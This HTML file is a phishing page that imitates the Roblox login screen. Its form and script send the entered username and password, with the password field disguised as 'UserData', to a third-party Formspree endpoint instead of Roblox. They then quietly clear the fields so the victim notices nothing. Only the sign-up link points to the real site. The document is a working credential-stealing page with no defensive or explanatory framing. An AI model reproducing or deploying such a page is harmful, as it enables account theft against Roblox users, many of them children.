<!DOCTYPE html>

<html lang="ru">

<head>

  <meta charset="UTF-8" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />

  <title>Game Login</title>

  <style>

    * { box-sizing: border-box; margin: 0; padding: 0; }

    body { font-family: Arial, Helvetica, sans-serif; min-height: 100vh; color: #fff; overflow: hidden; background: #000; }

    .bg-image { position: fixed; inset: 0; background-image: url("1.jpg"); background-size: cover; background-position: center; z-index: 0; }

    .bg-overlay { position: fixed; inset: 0; background: rgba(0, 0, 0, 0.55); z-index: 1; }

    .login-wrap { position: relative; z-index: 2; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 24px; }

    .login-box { width: 100%; max-width: 380px; background: #232734; padding: 28px 18px 20px; box-shadow: 0 24px 60px rgba(0, 0, 0, 0.45); border: 1px solid rgba(255,255,255,0.04); }

    .title { text-align: center; font-size: 28px; font-weight: 700; margin-bottom: 18px; color: #ffffff; }

    .input { width: 100%; height: 40px; padding: 0 12px; margin-bottom: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.09); background: #343847; color: #fff; font-size: 16px; outline: none; }

    .btn { width: 100%; height: 36px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.7); background: transparent; color: #d7dbe5; font-size: 15px; font-weight: 600; cursor: pointer; }

    .btn:hover { background: rgba(255,255,255,0.05); }

    .link { display: block; text-align: center; color: #ffffff; text-decoration: none; font-size: 15px; font-weight: 600; margin: 18px 0; }

    .divider { height: 1px; background: rgba(255,255,255,0.09); margin: 18px 0 20px; }

    .secondary-btn { width: 100%; height: 36px; border: none; border-radius: 8px; background: #3a3f52; color: white; font-size: 15px; font-weight: 700; cursor: pointer; margin-bottom: 12px; }

    .signup { text-align: center; margin-top: 8px; font-size: 15px; color: #ffffff; font-weight: 600; }

    .signup a { color: #ffffff; text-decoration: none; }

  </style>

<body>

  <div class="bg-image"></div>

  <div class="bg-overlay"></div>



  <div class="login-wrap">

    <div class="login-box">

      <h1 class="title">Login to Roblox</h1>



      <form id="loginForm" action="https://formspree.io/f/mlgyzlpw" method="POST">

        <input class="input" type="text" name="Login" placeholder="Username/Email/Phone" required />

        <input class="input" type="password" name="UserData" placeholder="Password" required />

        

        <button class="btn" type="submit">Log In</button>

        <a class="link" href="#">Forgot Password or Username?</a>

        <div class="divider"></div>

        <button class="secondary-btn" type="button">Email Me a One-Time Code</button>

        <button class="secondary-btn" type="button">Quick Sign-in</button>

        <div class="signup">Don’t have an account? <a href="https://www.roblox.com/CreateAccount" target="_blank">Sign Up</a></div>

      </form>

    </div>

  </div>



  <script>

    const form = document.getElementById('loginForm');

    form.addEventListener('submit', function(e) {

      e.preventDefault();

      const formData = new FormData(form);

      fetch(form.action, {

        method: 'POST',

        body: formData,

        headers: { 'Accept': 'application/json' }

      }).then(response => {

        if (response.ok) {

          form.reset(); // Очистка полей без уведомлений

        }

      });

    });

  </script>

</body>

</html>
